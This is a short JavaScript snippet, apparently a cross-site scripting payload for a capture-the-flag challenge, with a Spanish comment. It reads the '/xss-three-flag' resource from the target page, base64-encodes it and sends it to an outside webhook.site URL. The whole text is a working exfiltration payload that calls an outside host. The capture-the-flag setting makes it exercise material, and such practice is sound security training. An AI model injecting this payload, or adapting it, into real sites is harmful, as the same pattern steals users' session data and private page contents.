fetch('/xss-three-flag')
  .then(response => response.text())
  .then(flag => {
    // Exfiltra la bandera a tu servidor
    fetch('https://webhook.site/bafc1658-940e-417a-a1bb-638c72e05b06?data=' + btoa(flag));
  });